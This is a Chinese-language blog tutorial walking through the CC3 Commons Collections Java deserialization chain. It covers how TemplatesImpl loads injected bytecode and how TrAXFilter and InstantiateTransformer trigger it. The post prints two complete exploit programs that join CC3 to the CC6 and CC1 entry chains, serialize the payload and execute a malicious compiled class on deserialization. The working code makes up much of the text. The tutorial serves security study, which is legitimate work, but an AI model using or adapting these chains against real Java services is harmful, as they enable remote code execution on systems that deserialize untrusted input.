    <content type="html"><![CDATA[<h5 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h5><p>前面链子都是命令执行，但很多时候服务器的黑名单会选择禁用 <code>Runtime</code>，因此CC3用到<strong>动态类加载</strong>实现自动执行<strong>恶意类代码</strong></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313090142115.png" alt="image-20230313090142115"></p><p>回顾一下类的动态加载这块的东西</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313110500668.png" alt="image-20230313110500668" style="zoom:80%;" /><p>这里我们可以正向看，首先是 <code>loadClass()</code>，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 <code>findClass()</code></p><p>对于 <code>findClass()</code> 方法：</p><ul><li>根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下</li><li>通常由子类去实现</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// findClass 方法的源代码</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NetworkClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> Class <span class="title function_">findClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] b = loadClassData(name);</span><br><span class="line">             <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">private</span> <span class="type">byte</span>[] loadClassData(String name) &#123;</span><br><span class="line">             <span class="comment">// load the class data from the connection</span></span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 子类的实现方式</span></span><br></pre></td></tr></table></figure><p><code>defineClass()</code> 的作用是处理前面传入的字节码，将其处理成真正的 Java 类，但此时的 <code>defineClass()</code> 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 <code>newInstance()</code> 的实例化</p><p>开始由下往上分析CC3链：</p><p>首先我们先看看有什么方法调用defineClass，这里defineClass为protected，我们需要找到重写他并且为pubilc的方法</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313105017567.png" alt="image-20230313105017567"></p><p>在Templateslmpl中找到合适的defineClass</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313104651089.png" alt="image-20230313104651089"></p><p>查找调用这个defineClass的地方，我们跟到了defineTransletClasses()下，他执行了一个<code>loader.defineClass(_bytecodes[i])</code>，相当于这里可以将我们的恶意类返回来，我们需要满足上面的条件，<code>_bytecodes</code> 不为空，<code>_tfactory</code> 不为空</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313114533067.png" alt="image-20230313114533067"></p><p>但defineTransletClasses方法是一个私有方法，我们看看谁调用了这个方法</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313112742341.png" alt="image-20230313112742341"></p><p>选择<code>defineTransletClasses()</code> 方法，这里有一个 <code>newInstance()</code> 实例化的过程，如果能走完这个函数那么就能动态执行代码</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313111424374.png" alt="image-20230313111424374"></p><p>这里要<code>_name</code>不为空，<code>_Class</code>为空才能执行defineTransletClasses()方法，最后将返回来的恶意类进行实例化，可以通过反射修改参数值满足要求。但是这个<code>getTransletInstance()</code> 方法是私有的，还得继续找</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313111602672.png" alt="image-20230313111602672" style="zoom: 60%;" /><p>我们找到了newTransformer的位置，分析代码我们只需要执行newTransformer就可以了</p><p><code>_class</code> 的值应当为 null，<code>TemplatesImpl</code> 的构造方法中没有给 <code>_class</code> 赋初值，所以不用管它</p><p><code>_name</code> 的值，这里需要的是 String，所以我们通过反射简单赋个 String 即可</p><p><code>_bytecodes</code> 这个比较难，我们过一遍：</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313125130933.png" alt="image-20230313125130933" style="zoom:93%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313120511914.png" alt="image-20230313120511914" style="zoom:60%;" /><p><code>_bytecodes</code> 需要的是一个二维数组，所以我们创建一个二维数组。但是 <code>_bytecodes</code> 作为传递进 defineClass 方法的值是一个一维数组。这个一维数组里面我们需要存放恶意的字节码</p><p>先写一个 Test.class 的恶意类并编译，直接编写静态代码块就可以了，因为在类初始化的时候会自动执行代码</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313120318823.png" alt="image-20230313120318823"></p><p>这一段伪代码可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;刚刚生成的.class文件绝对路径&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br></pre></td></tr></table></figure><p>还有 <code>_tfactory</code> ，我们也过一遍</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313125228345.png" alt="image-20230313125228345" style="zoom:80%;" /><p><code>_tfactory</code> 的值在 <code>TemplatesImpl</code> 这一类中被定义如下，关键字是 <code>transient</code>，不可被序列化</p><p>直接修改是不行的，但是我们这里的利用要求比较低，只要让 <code>_tfactory</code> 不为 null 即可，我们去看一看 <code>_tfactory</code> 的其他定义如何。在 <code>readObject()</code> 方法中，找到了 <code>_tfactory</code> 的初始化定义</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313125526660.png" alt="image-20230313125526660" style="zoom: 60%;" /><p>得到最终完整的 EXP ，但报了空指针错误</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313125817209.png" alt="image-20230313125817209"></p><p>按照道理来说上面的 EXP 已经挺完美的了，但是运行的时候不但没有弹出计算器，反而还报错了</p><p>在<code>TemplatesImpl</code> 类第 393 行 <code>if (_bytecodes == null)</code> 那里打断点，调试之后发现问题出在这儿</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313130731302.png" alt="image-20230313130731302"></p><p>418 行，判断在 <code>defineClass()</code> 方法中传进去的参数 b 数组的字节码是否继承了 <code>ABSTRACT_TRANSLET</code> 这个父类，如果没有则抛出异常，所以我们需要去恶意类中继承 <code>ABSTRACT_TRANSLET</code> 这个父类</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313130843393.png" alt="image-20230313130843393"></p><p>或者我们可以将 <code>_auxClasse</code> 赋值，使其不为 null。但是如果没有继承 <code>ABSTRACT_TRANSLET</code> 这个父类，会导致 <code>_transletIndex</code> 的值为 -1，仍然会在第 426 行的判断当中跳出程序。所以恶意类必须继承 <code>ABSTRACT_TRANSLET</code> 这个父类</p><p>修改后的恶意类，重新编译</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313130941389.png" alt="image-20230313130941389" style="zoom:50%;" /><p>成功执行命令</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313131028332.png" alt="image-20230313131028332"></p><p>拼接CC1&#x2F;CC3链的前半部分，相当于换了一个代码执行的方法</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313161447093.png" alt="image-20230313161447093" style="zoom:67%;" /><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313160605765.png" alt="image-20230313160605765"></p><h6 id="ysoserial-正版链子的-TemplatesImpl-的实现方式"><a href="#ysoserial-正版链子的-TemplatesImpl-的实现方式" class="headerlink" title="ysoserial 正版链子的 TemplatesImpl 的实现方式"></a><strong>ysoserial 正版链子的 TemplatesImpl 的实现方式</strong></h6><p>有些情况不仅把Runtime.exex()过滤了，把InvokeTransformer也过滤了，要换一个类</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313163122699.png" alt="image-20230313163122699"></p><p>只需要调用 <code>TemplatesImpl</code> 类的 <code>newTransformer()</code> 方法，便可以进行命令执行，查找调用 <code>newTransformer()</code> 方法的地方</p><p>这里找到TrAXFilter这个类</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313172811328.png" alt="image-20230313172811328" style="zoom:67%;" /><p>虽然它没继承Serializable接口，不能序列化，但是它的构造函数是有搞头的，我们只要执行这个类的构造函数即可命令执行</p><p>CC3 这里的作者没有调用 <code>InvokerTransformer</code>，而是调用了一个新的类 <code>InstantiateTransformer</code>，这个类是用来初始化 <code>Transformer</code> 的，我们去找 <code>InstantiateTransformer</code> 类下的 <code>transform</code> 方法，完美契合我们的需求</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313173145786.png" alt="image-20230313173145786"></p><p>InstantiateTransformer构造函数传入 <code>new Class[]&#123;Templates.class&#125;</code> 与 <code>new Object[]&#123;templates&#125;</code></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313173248270.png" alt="image-20230313173248270" style="zoom:80%;" /><p>然后调用InstantiateTransformer的transform方法获取TrAXFilter的构造器并调用构造函数即可</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313174112454.png" alt="image-20230313174112454"></p><p>这样后半部分 EXP 就写好了，我们去找入口类的前半部分。前半部分链子是从谁调用了 <code>transform</code> 方法开始，所以 CC1 链和 CC6 链的前半部分 EXP 都是有效的</p><p>拼接CC6：</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313180109757.png" alt="image-20230313180109757"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">byteField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        byteField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\micgo\\IdeaProjects\\CommonCollection\\target\\classes\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        byteField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span></span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);  前面我们定义了new ConstantTransformer(templates)，这个类是需要我们传参的，传入1即可</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//第二个参数任意，因为后面反射会修改</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.clear();   <span class="comment">//把值删了，不然反序列化的时候已经存在key值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拼接CC1：</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313181449089.png" alt="image-20230313181449089"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">byteField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        byteField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\micgo\\IdeaProjects\\CommonCollection\\target\\classes\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        byteField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span></span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);  前面我们定义了new ConstantTransformer(templates)，这个类是需要我们传参的，传入1即可</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annocationInvocationHandler</span> <span class="operator">=</span> c2.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annocationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annocationInvocationHandler.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annocationInvocationHandler.newInstance(Override.class,mapProxy);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>噢还有就是这一段注释掉也是可以执行的，只有直接执行的时候需要手动赋值，反序列化的时候会自动赋值</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313182055186.png" alt="image-20230313182055186"></p><p>再来回顾一下流程图</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230313163122699.png" alt="image-20230313163122699"></p>]]></content>
    
    
      
      
